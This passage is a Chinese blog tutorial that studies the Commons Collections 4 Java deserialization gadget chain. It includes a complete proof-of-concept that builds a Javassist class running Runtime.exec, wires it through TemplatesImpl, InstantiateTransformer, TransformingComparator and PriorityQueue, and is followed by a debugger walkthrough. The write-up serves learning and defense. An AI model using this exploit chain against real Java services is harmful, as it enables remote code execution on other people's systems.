<!DOCTYPE html>
<html lang="zh-CN">

<head>
        <link rel="canonical" href="https://myanmaraddress.github.io/html/category/article-1230.htm" />
    <title>CommonsCollection4反序列化链学习 - Myanmar Address</title>
        <link rel="icon" href="/assets/addons/xcblog/img/myanmaraddress/favicon.ico" type="image/x-icon"/>
    <link href="/assets/addons/xcblog/css/myanmaraddress/bootstrap.css" rel="stylesheet" type="text/css" media="all">
    <!--theme-style-->
    <link href="/assets/addons/xcblog/css/myanmaraddress/style.css" rel="stylesheet" type="text/css" media="all">
    <!--//theme-style-->
    <link href="/assets/addons/xcblog/css/myanmaraddress/popuo-box.css" rel="stylesheet" type="text/css" media="all" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- script -->
    <script src="/assets/addons/xcblog/js/frontend/myanmaraddress/jquery.min.js"></script>
    <script type="text/javascript" src="/assets/addons/xcblog/js/frontend/myanmaraddress/move-top.js"></script>
    <script type="text/javascript" src="/assets/addons/xcblog/js/frontend/myanmaraddress/easing.js"></script>
    <link type="text/css" rel="stylesheet" href="/assets/addons/xcblog/css/myanmaraddress/jquery.mmenu.all.css" />
    <script type="text/javascript">
    $(window).load(function() {
        $('div.description').each(function() {
            $(this).css('display', 'block');
        });

        $('div.content-top-grid').hover(function() {
            $(this).children('.description').stop().fadeTo(500, 1);
        }, function() {
            $(this).children('.description').stop().fadeTo(500, 0);
        });

    });
    </script>
    <script type="text/javascript" src="/assets/addons/xcblog/js/frontend/myanmaraddress/jquery.mmenu.js"></script>
    <script type="text/javascript">
    //	The menu on the left
    $(function() {
        $('nav#menu-left').mmenu();
    });
    </script>
    <script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?e4890e777e20237a4f5a0c3a6a01049c";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
     crossorigin="anonymous"></script>
</head>

<body>
    <!--header-->
    <div class="header">
        <a class="navicon" href="#menu-left"> </a>
        <div class="container">
            <div class="header-matter">
                <h1>CommonsCollection4反序列化链学习</h1>
                <p>
                    <a href="/">首页</a> / <a href="/html/category/">文章分类</a> / 正文
                </p>
            </div>
        </div>
                <nav id="menu-left">
            <ul>
                                <li><a href="/">首页</a></li>
                                <li><a href="/html/category/">文章分类</a></li>
                                <li>
                    <a href="#">关于</a>
                </li>
                <li>
                    <a href="#">联系</a>
                </li>
            </ul>
        </nav>
        <script type="text/javascript">
        jQuery(document).ready(function($) {
            $(".scroll").click(function(event) {
                event.preventDefault();
                $('html,body').animate({ scrollTop: $(this.hash).offset().top }, 1000);
            });
        });
        </script>
    </div>
    <div class="clearfix"> </div>
    <!--//header-->
    <!--content-->
    <div class="content">
        <!--our-news-->
        <div class="our-news" id="news">
            <div class="container">
                <div class="row">
                    <div class="col-md-9">
                        <div class="news">
                              				  				  				<h1 id="commonscollection4">CommonsCollection4</h1> <h2 id="1前置知识">1、前置知识</h2> <p>由于cc4没有新的知识点，主要是用cc2，然后稍微cc3结合了，所以我们可以看ysoserial源码，自己尝试构造一下，把cc2通过获取InvokeTransformer()获取templatesImpl的newtransformer()方法，改成用cc3的InstantiateTransformer初始化。那就把跟cc2不同的代码学习下。</p> <h3 id="11transformingcomparator">1.1、transformingComparator</h3> <p>与cc2最大的不容就是transformingComparator的构造方式不同，这里是通过获取InstantiateTransformer实例化TrAXFilter并且把templatesImpl恶意类传入，其实就是<strong>InstantiateTransformer(templateImpl).transform(TrAXFilter)</strong>。而且这就是cc3所用的方式，所以cc3在cc4占很少的部分，主要还是cc2</p> <pre><code class="language-java">Transformer[] transformers=new Transformer[]{         new ConstantTransformer(TrAXFilter.class),//第一个获取TrAXFilter         new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})//通过InstantiateTransformer的构造方法传入我们的恶意类templatesImpl，调用其transform方法，实例化传入的TrAXFilter，调用其构造方法。再调用newTransform  }; ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);//新建一个ChainedTransformer类，传入我们的恶意transformers,只要调用transform方法就会反射执行我们的传入的恶意传入我们的恶意transformers  TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);</code></pre> <h2 id="2poc分析">2、PoC分析</h2> <h3 id="21poc">2.1、Poc</h3> <pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.functors.InvokerTransformer;  import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue;  public class CommonsCollection4 {       public static void main(String[] args) throws Exception {         String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";         String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";          ClassPool classPool=ClassPool.getDefault();//返回默认的类池         classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径         CtClass payload=classPool.makeClass("com/akkacloud/CommonsCollection2Test");//创建一个新的public类         payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet         payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\");"); //创建一个空的类初始化，设置构造函数主体为runtime          //payload.writeFile("/Users/akka/Documents/study/JAVA-project/ysoserial/CommonsColection2/src/main/java");         byte[] bytes=payload.toBytecode();//转换为byte数组         //String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";         Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl         Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");//反射获取templatesImpl的_bytecodes字段         field.setAccessible(true);//暴力反射         field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组          Field field1=templatesImpl.getClass().getDeclaredField("_name");//反射获取templatesImpl的_name字段         field1.setAccessible(true);//暴力反射         field1.set(templatesImpl,"test");//将templatesImpl上的_name字段设置为test  /*        Method getTransletName = templatesImpl.getClass().getDeclaredMethod("getTransletName", new Class[]{});         getTransletName.setAccessible(true);         Object name = getTransletName.invoke(templatesImpl, new Object[]{});         System.out.println(name.toString());          Method getTransletBytecodes = templatesImpl.getClass().getDeclaredMethod("getTransletBytecodes", new Class[]{});         getTransletBytecodes.setAccessible(true);         byte[][] bytes1 = (byte[][]) getTransletBytecodes.invoke(templatesImpl, new Object[]{});         for (int i = 0; i &lt; bytes1.length; i++) {             System.out.println(bytes1.length);             System.out.println(Arrays.toString(bytes1[i]));         }*/          Transformer[] transformers=new Transformer[]{                 new ConstantTransformer(TrAXFilter.class),//第一个获取TrAXFilter                 new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})//通过InstantiateTransformer的构造方法传入我们的恶意类templatesImpl，调用其transform方法，实例化传入的TrAXFilter，调用其构造方法。再调用newTransform          };         ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);//新建一个ChainedTransformer类，传入我们的恶意transformers,只要调用transform方法就会反射执行我们的传入的恶意传入我们的恶意transformers          TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);          PriorityQueue priorityQueue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。         priorityQueue.add(1);//添加数字1插入此优先级队列         priorityQueue.add(1);//添加数字1插入此优先级队列          Field field2=priorityQueue.getClass().getDeclaredField("comparator");//获取PriorityQueue的comparator字段         field2.setAccessible(true);//暴力反射         field2.set(priorityQueue,transformingComparator);//设置priorityQueue的comparator属性值为transformingComparator          ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.ser"));         outputStream.writeObject(priorityQueue);         outputStream.close();          ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.ser"));         inputStream.readObject();         } }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/84a594027e9869bd4059b17a5abf6574.jpg" alt="CommonsCollection4反序列化链学习"></p> <h3 id="22poc调试">2.2、poc调试</h3> <p>在PriorityQueue的readObject打断点，发现队列内就是两个数字，进入heapify()</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/0c056ce0e551c67eae8cc5f86937115b.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>因为在poc中我们没对queue字段赋值，所以queue里面就是两个数字，继续跟入siteDown()</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/9dcbfaaac19dc31ccb8a49629f6f4241.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>发现x就是queue为空，与cc2此时的x为templatImpl，继续进入siftDownUsingComparator</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/75c08ec62d1dc7ac4c4c73302db5e27c.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入发现，通过comparator.compare(),这个comparator就是我们的恶意TransformingComparator</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/613ef9ebb1aacc142addfa63488c4ad4.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入发现TransformingComparator的compare方法里，用this.transformer调用了transform方法，此时的this.transformer是我们传入的ChainedTransformer，链式调用transform</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/e4fb2106781139889ca028ec6f4a797a.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入后看到第一个是ConstantTransformer，继续跟进transform方法</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/6bdc85e64e6354ba55e91a49759e3526.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>返回我们一开始构造的TrAXFilter.class</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/7794999994be7591e23690cbaead6a11.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>第二遍是进入InstantiateTransformer ，object为我们上次循环获取TrAXFilter.class.继续跟进transform()</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/5d60e424dc99179ffebd52658e78d527.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>这个transform就是实例化传入的object既TrAXFilter，而且传入的参数值为我们一起开始创建的恶意加载字节类TransformerImpl</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/3cc72a1ebab4ecb8231b191dad0f7eb6.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入TrAXFilter的构造方法，传入的TransformerImpl被赋值给了templates，templates调用newTransformer方法，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/4053a6d56747f82c3fbfca71f953de89.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>TransformerImpl的newTransformer方法，会调用本类的getTransletInstance方法，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/dc40946cbc03f89b8931759229136802.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>发现会继续调用defineTransletClasses()，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/09c72b1c7ea2b97aaf03a40edd4c4ded.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入defineTransletClasses方法后发现，会把我们前面构造的_bytecodes[i]传输给_class[i],饭后返回到getTransletInstance方法</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/7fea6927a613b9eccd7b8c02145e97b9.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>然后在getTransletInstance方法后，实例化我们传入的_class[i]恶意类<mark>》TemplatesImpl</mark>》CommonsCollection2Test.</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/89b07006097f1bc7ced2773721289386.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>实例化就会调用我们一开始设置的静态代码块，造成RCE</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/e4f8b70a95347430a5b2ae087167ee6f.jpg" alt="CommonsCollection4反序列化链学习"></p> <h3 id="23利用链">2.3、利用链</h3> <pre><code class="language-java">Gadget chain: 		ObjectInputStream.readObject() 			PriorityQueue.readObject()         PriorityQueue.heapify()           PriorityQueue.siftDown()             PriorityQueue.siftDownUsingComparator()               ...                 TransformingComparator.compare()                   InstantiateTransformer.transform()                     Method.invoke()                       Runtime.exec()</code></pre> <h3 id="24思维导图">2.4、思维导图</h3> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/4520c68ba4af81158b42d55f39d15b37.jpg" alt="CommonsCollection4反序列化链学习"></p> <h3 id="25结束">2.5、结束</h3> <p>cc4链还是比较简单，我继续每一步调试的原因就是可以更好的复习前面学习的链，我cc2和cc4用的是commonscollection4依赖版本才成功，cc1、cc3和cc5是用的jdk8u66才成功的</p> 			                        </div>

                        <div class="col-md-12 mt-5">
                                                        <p>上一个：<a href="/html/category/article-1229.htm">PHP Spotting参考详解</a></p>
                                                        <p>下一个：<a href="/html/category/article-1231.htm">为什么我们不应该在MySQL SELECT查询中不使用没有GROUP BY子句的非组字段的组函数？</a></p>
                                                    </div>

                                            </div>
                    <div class="col-md-3">
                    	<div class="panel panel-default">
    <div class="panel-heading">
        <h3 class="panel-title">热门文章</h3>
    </div>
    <div class="panel-body">
        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
                        <li class="py-2"><a href="/html/category/article-1962.htm" title="记录detector2使用中的PyYAML报错">记录detector2使用中的PyYAML报错</a></li>
                        <li class="py-2"><a href="/html/category/article-1294.htm" title="OpenFeign、Feign以及Ribbon关系介绍">OpenFeign、Feign以及Ribbon关系介绍</a></li>
                        <li class="py-2"><a href="/html/category/article-1295.htm" title="带你快速认识NamenodeHA和Yarn HA,为搭建HadoopHA集群打下基础!">带你快速认识NamenodeHA和Yarn HA,为搭建HadoopHA集群打下基础!</a></li>
                        <li class="py-2"><a href="/html/category/article-1318.htm" title="vue项目中,如何实现excel的导入导出excel导入功能-组件封装">vue项目中,如何实现excel的导入导出excel导入功能-组件封装</a></li>
                        <li class="py-2"><a href="/html/category/article-3737.htm" title="2.使用httpclient发起post请求">2.使用httpclient发起post请求</a></li>
                        <li class="py-2"><a href="/html/category/article-1296.htm" title="Android 12(S) 图像显示系统 &#8211; SurfaceFlinger 之 VSync &#8211; 中篇（十七）">Android 12(S) 图像显示系统 &#8211; SurfaceFlinger 之 VSync &#8211; 中篇（十七）</a></li>
                        <li class="py-2"><a href="/html/category/article-1360.htm" title="Gin增删改查demo">Gin增删改查demo</a></li>
                        <li class="py-2"><a href="/html/category/article-2832.htm" title="pytorch 自动构建任意层的深度神经网络(DNN)">pytorch 自动构建任意层的深度神经网络(DNN)</a></li>
                        <li class="py-2"><a href="/html/category/article-1933.htm" title="vue组件间的传值，父传子，子传父，兄弟之间传值，跨级传值">vue组件间的传值，父传子，子传父，兄弟之间传值，跨级传值</a></li>
                        <li class="py-2"><a href="/html/category/article-1309.htm" title="sqlserver 中使用sqlcmd 执行几百M的.sql文件">sqlserver 中使用sqlcmd 执行几百M的.sql文件</a></li>
                    </ul>
    </div>
</div>

<div class="panel panel-default">
    <div class="panel-heading">
        <h3 class="panel-title">归纳</h3>
    </div>
    <div class="panel-body">
        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">58</span> <a href="/html/date/2024-06/" title="2024-06 归档">2024-06</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">62</span> <a href="/html/date/2024-05/" title="2024-05 归档">2024-05</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">60</span> <a href="/html/date/2024-04/" title="2024-04 归档">2024-04</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">62</span> <a href="/html/date/2024-03/" title="2024-03 归档">2024-03</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">50</span> <a href="/html/date/2024-02/" title="2024-02 归档">2024-02</a></h4>
            </li>
                    </ul>
    </div>
</div>

                    </div>
                </div>
            </div>
        </div>
    </div>
    <!--//content-->
        <!--footer-->
    <div class="footer">
        <div class="container">
            <p>
                Myanmar Address 版权所有
                <br />
                Powered by WordPress
            </p>
        </div>
    </div>
    <script>
    $(function() {
        $('.js_to').click(function(){
            var url = $(this).data('url');
            var code = $(this).data('code');
            url += code;

            window.open(url);
        })
    });
    </script>
</body>

</html>